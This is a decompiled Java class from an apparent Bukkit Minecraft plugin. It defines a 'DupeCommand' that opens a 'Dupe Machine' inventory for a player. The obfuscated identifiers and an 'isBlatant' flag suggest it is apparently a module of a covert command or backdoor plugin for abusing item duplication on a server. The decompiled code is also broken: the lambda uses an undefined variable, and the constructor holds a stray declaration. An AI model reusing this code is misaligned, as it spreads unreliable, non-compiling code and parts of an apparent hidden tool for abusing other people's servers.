/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.Inventory
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.plugin.Plugin;

public class DupeCommand
extends Command {
    @Override
    public void execute(Core llllllllllllllIIllIIIIlIIlIlIIll, String llllllllllllllIIllIIIIlIIlIlIllI, String[] llllllllllllllIIllIIIIlIIlIlIlIl, Player llllllllllllllIIllIIIIlIIlIlIIlI) {
        llllllllllllllIIllIIIIlIIlIlIIll.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)llllllllllllllIIllIIIIlIIlIlIIll, () -> {
            Inventory llllllllllllllIIllIIIIlIIlIIlIll = Bukkit.createInventory(null, (int)27, (String)String.valueOf(new StringBuilder().append(Settings.RED).append(">> ").append(Settings.NAME).append(" Dupe Machine")));
            llllllllllllllIIllIIIIlIIlIIlIlI.inventories.add(llllllllllllllIIllIIIIlIIlIIlIll);
            llllllllllllllIIllIIIIlIIlIlIIlI.openInventory(llllllllllllllIIllIIIIlIIlIIlIll);
        });
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    public DupeCommand() {
        DupeCommand llllllllllllllIIllIIIIlIIlIlllII;
    }
}

